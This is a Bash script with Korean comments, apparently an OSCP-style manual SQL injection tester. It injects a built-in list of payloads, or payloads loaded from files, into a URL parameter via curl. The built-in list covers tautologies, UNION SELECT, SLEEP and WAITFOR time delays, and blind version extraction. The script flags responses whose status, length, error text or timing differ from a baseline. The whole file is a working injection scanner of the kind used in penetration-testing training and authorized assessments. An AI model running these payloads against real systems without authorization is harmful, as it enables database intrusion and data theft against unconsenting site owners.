#!/bin/bash

# SQLi 수동 테스터 - OSCP 호환 (개선판)
# 사용법: ./sqli_tester.sh -u "http://target.com/page.php?id=1" --payloads payload1.txt dir1/ ... [-o 결과파일]

# 색상 코드 정의
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

TARGET_URL=""
RAW_INPUTS=()
PAYLOAD_FILES=()
OUTPUT_FILE="sqli_results_$(date +%Y%m%d_%H%M%S).txt"
TIMEOUT=10
THREADS=5

# 기본 페이로드들 (파일이 없을 경우)
DEFAULT_PAYLOADS=(
    "'"
    "''"
    "' OR '1'='1"
    "' OR 1=1--"
    "' OR 1=1#"
    "' OR 1=1/*"
    "' UNION SELECT NULL--"
    "' UNION SELECT 1,2,3--"
    "' AND SLEEP(5)--"
    "' OR SLEEP(5)--"
    "'; WAITFOR DELAY '00:00:05'--"
    "' OR 1=1 AND ASCII(SUBSTRING((SELECT @@version),1,1))>64--"
)

print_banner() {
    echo -e "${CYAN}"
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║                    SQLi 수동 테스터                            ║"
    echo "║                      OSCP 호환 버전                           ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

print_usage() {
    echo -e "${YELLOW}사용법:${NC}"
    echo "  $0 -u \"http://target.com/page.php?id=1\" --payloads payload1.txt dir1/ ... [옵션]"
    echo ""
    echo -e "${YELLOW}옵션:${NC}"
    echo "  -u URL           대상 URL (필수)"
    echo "  --payloads FILES 페이로드 파일들 또는 디렉터리"
    echo "  -o FILE          결과 저장 파일"
    echo "  -t SECONDS       타임아웃 (기본값: 10초)"
    echo "  --threads NUM    동시 요청 수 (기본값: 5)"
    echo "  -h, --help       도움말"
    echo ""
    echo -e "${YELLOW}예시:${NC}"
    echo "  $0 -u \"http://10.10.10.100/search.php?q=test\" --payloads sqli_payloads.txt"
    echo "  $0 -u \"http://target.com/page.php?id=1\" --payloads payload_dir/ -t 15"
}

# 재귀적으로 페이로드 파일 수집
enumerate_payloads() {
    local path="$1"
    if [[ -f "$path" ]]; then
        if [[ -r "$path" ]]; then
            PAYLOAD_FILES+=("$path")
            echo -e "${GREEN}[+]${NC} 페이로드 파일 추가: $path"
        else
            echo -e "${RED}[!]${NC} 파일 읽기 권한 없음: $path"
        fi
    elif [[ -d "$path" ]]; then
        local count=0
        while IFS= read -r -d '' file; do
            if [[ -r "$file" ]]; then
                PAYLOAD_FILES+=("$file")
                ((count++))
            fi
        done < <(find "$path" -type f \( -name "*.txt" -o -name "*.list" \) -print0 2>/dev/null)
        echo -e "${GREEN}[+]${NC} 디렉터리에서 $count개 파일 발견: $path"
    else
        echo -e "${RED}[!]${NC} 경로가 존재하지 않음: $path"
    fi
}

# 인자 파싱
while [[ "$#" -gt 0 ]]; do
    case $1 in
        -u) TARGET_URL="$2"; shift ;;
        --payloads)
            shift
            while [[ "$#" -gt 0 && ! "$1" =~ ^- ]]; do
                RAW_INPUTS+=("$1")
                shift
            done
            continue
            ;;
        -o) OUTPUT_FILE="$2"; shift ;;
        -t) TIMEOUT="$2"; shift ;;
        --threads) THREADS="$2"; shift ;;
        -h|--help) print_usage; exit 0 ;;
        *) echo -e "${RED}[!]${NC} 잘못된 옵션: $1" >&2; print_usage; exit 1 ;;
    esac
    shift
done

# 유효성 검사
if [[ -z "$TARGET_URL" ]]; then
    echo -e "${RED}[!]${NC} URL이 필요합니다."
    print_usage
    exit 1
fi

if ! command -v curl >/dev/null 2>&1; then
    echo -e "${RED}[!]${NC} curl이 설치되어 있지 않습니다."
    echo "설치: sudo apt-get install curl"
    exit 1
fi

print_banner

echo -e "${BLUE}[*]${NC} 대상 URL: $TARGET_URL"
echo -e "${BLUE}[*]${NC} 타임아웃: ${TIMEOUT}초"
echo -e "${BLUE}[*]${NC} 결과 파일: $OUTPUT_FILE"

# 페이로드 파일 수집
if [[ ${#RAW_INPUTS[@]} -gt 0 ]]; then
    echo -e "${BLUE}[*]${NC} 페이로드 파일 수집 중..."
    for input in "${RAW_INPUTS[@]}"; do
        enumerate_payloads "$input"
    done
else
    echo -e "${YELLOW}[*]${NC} 페이로드 파일이 지정되지 않아 기본 페이로드 사용"
fi

# URL 파라미터 검증
if ! [[ "$TARGET_URL" =~ "=" ]]; then
    echo -e "${RED}[!]${NC} URL에 파라미터(=)가 없습니다."
    exit 1
fi

# URL 분리
BASE_URL="${TARGET_URL%%=*}="
ORIGINAL_PARAM="${TARGET_URL#*=}"

echo -e "${BLUE}[*]${NC} 베이스 URL: $BASE_URL"
echo -e "${BLUE}[*]${NC} 원본 파라미터: $ORIGINAL_PARAM"

# 정상 응답 수집
echo -e "${BLUE}[*]${NC} 정상 응답 수집 중..."
BASELINE_RESPONSE=$(curl -s --max-time "$TIMEOUT" "$TARGET_URL" 2>/dev/null)
BASELINE_LENGTH=${#BASELINE_RESPONSE}
BASELINE_CODE=$(curl -s --max-time "$TIMEOUT" -o /dev/null -w "%{http_code}" "$TARGET_URL" 2>/dev/null)

if [[ -z "$BASELINE_RESPONSE" ]]; then
    echo -e "${RED}[!]${NC} 대상 서버에 연결할 수 없습니다."
    exit 1
fi

echo -e "${GREEN}[+]${NC} 정상 응답 길이: $BASELINE_LENGTH bytes"
echo -e "${GREEN}[+]${NC} 정상 HTTP 코드: $BASELINE_CODE"

# 결과 파일 초기화
{
    echo "SQLi 수동 테스트 결과"
    echo "======================"
    echo "대상 URL: $TARGET_URL"
    echo "테스트 시작: $(date)"
    echo "정상 응답 길이: $BASELINE_LENGTH bytes"
    echo "정상 HTTP 코드: $BASELINE_CODE"
    echo ""
} > "$OUTPUT_FILE"

# 페이로드 실행 함수
test_payload() {
    local payload="$1"
    local index="$2"
    local total="$3"
    
    # URL 인코딩된 페이로드 생성
    local encoded_payload=$(printf '%s' "$payload" | curl -Gso /dev/null -w '%{url_effective}' --data-urlencode @- "" | cut -c3-)
    local test_url="${BASE_URL}${encoded_payload}"
    
    # 요청 시작 시간
    local start_time=$(date +%s.%N)
    
    # 테스트 실행
    local response=$(curl -s --max-time "$TIMEOUT" "$test_url" 2>/dev/null)
    local http_code=$(curl -s --max-time "$TIMEOUT" -o /dev/null -w "%{http_code}" "$test_url" 2>/dev/null)
    
    # 응답 시간 계산
    local end_time=$(date +%s.%N)
    local duration=$(echo "$end_time - $start_time" | bc -l 2>/dev/null || echo "0")
    
    local response_length=${#response}
    local length_diff=$((response_length - BASELINE_LENGTH))
    local status="NORMAL"
    local color="${NC}"
    
    # 이상 징후 탐지
    if [[ "$http_code" != "$BASELINE_CODE" ]]; then
        status="HTTP_CHANGE"
        color="${YELLOW}"
    elif [[ $length_diff -gt 50 ]] || [[ $length_diff -lt -50 ]]; then
        status="LENGTH_CHANGE"
        color="${PURPLE}"
    elif echo "$response" | grep -qi "error\|warning\|mysql\|oracle\|postgresql\|syntax\|sql"; then
        status="ERROR_DETECTED"
        color="${RED}"
    elif [[ $(echo "$duration > 3" | bc -l 2>/dev/null || echo 0) -eq 1 ]]; then
        status="TIME_DELAY"
        color="${GREEN}"
    fi
    
    # 진행률 표시
    local progress=$((index * 100 / total))
    printf "\r${CYAN}[진행률: %3d%%]${NC} 테스트 중: %s" "$progress" "${payload:0:30}..."
    
    # 이상 징후가 있는 경우만 출력
    if [[ "$status" != "NORMAL" ]]; then
        printf "\n${color}[%s]${NC} %s\n" "$status" "$payload"
        printf "  └─ HTTP: %s | 길이: %d (%+d) | 시간: %.2fs\n" "$http_code" "$response_length" "$length_diff" "$duration"
        
        # 결과 파일에 기록
        {
            echo "[$status] $payload"
            echo "  HTTP 코드: $http_code"
            echo "  응답 길이: $response_length bytes ($length_diff)"
            echo "  응답 시간: ${duration}s"
            echo "  테스트 URL: $test_url"
            echo "  응답 일부: ${response:0:200}..."
            echo ""
        } >> "$OUTPUT_FILE"
        
        return 1  # 이상 징후 발견
    fi
    
    return 0  # 정상
}

# 페이로드 수집
ALL_PAYLOADS=()

if [[ ${#PAYLOAD_FILES[@]} -gt 0 ]]; then
    echo -e "${BLUE}[*]${NC} 페이로드 파일에서 로딩 중..."
    for file in "${PAYLOAD_FILES[@]}"; do
        while IFS= read -r line || [[ -n "$line" ]]; do
            # 빈 줄과 주석 제외
            if [[ -n "$line" && ! "$line" =~ ^[[:space:]]*# ]]; then
                ALL_PAYLOADS+=("$line")
            fi
        done < "$file"
    done
else
    ALL_PAYLOADS=("${DEFAULT_PAYLOADS[@]}")
fi

TOTAL_PAYLOADS=${#ALL_PAYLOADS[@]}
echo -e "${GREEN}[+]${NC} 총 $TOTAL_PAYLOADS개 페이로드 로드됨"

if [[ $TOTAL_PAYLOADS -eq 0 ]]; then
    echo -e "${RED}[!]${NC} 테스트할 페이로드가 없습니다."
    exit 1
fi

echo -e "${BLUE}[*]${NC} SQLi 테스트 시작..."
echo ""

# 테스트 실행
DETECTED_COUNT=0
for i in "${!ALL_PAYLOADS[@]}"; do
    if test_payload "${ALL_PAYLOADS[$i]}" $((i+1)) "$TOTAL_PAYLOADS"; then
        :  # 정상
    else
        ((DETECTED_COUNT++))
    fi
    
    # CPU 과부하 방지를 위한 짧은 대기
    sleep 0.1
done

# 최종 결과
echo ""
echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║                        테스트 완료                            ║${NC}"
echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
echo -e "${BLUE}[*]${NC} 총 페이로드: $TOTAL_PAYLOADS"
echo -e "${GREEN}[+]${NC} 이상 징후 발견: $DETECTED_COUNT"
echo -e "${BLUE}[*]${NC} 결과 저장: $OUTPUT_FILE"

{
    echo "테스트 완료: $(date)"
    echo "총 페이로드: $TOTAL_PAYLOADS"
    echo "이상 징후 발견: $DETECTED_COUNT"
} >> "$OUTPUT_FILE"

if [[ $DETECTED_COUNT -gt 0 ]]; then
    echo -e "${YELLOW}[!]${NC} 상세 결과는 $OUTPUT_FILE 파일을 확인하세요."
    echo -e "${YELLOW}[!]${NC} 수동으로 각 페이로드를 더 자세히 분석하세요."
else
    echo -e "${GREEN}[+]${NC} SQLi 취약점이 발견되지 않았습니다."
fi

# 임시 파일 정리
rm -f normal.txt test.txt 2>/dev/null

echo -e "${GREEN}[+]${NC} 스크립트 실행 완료"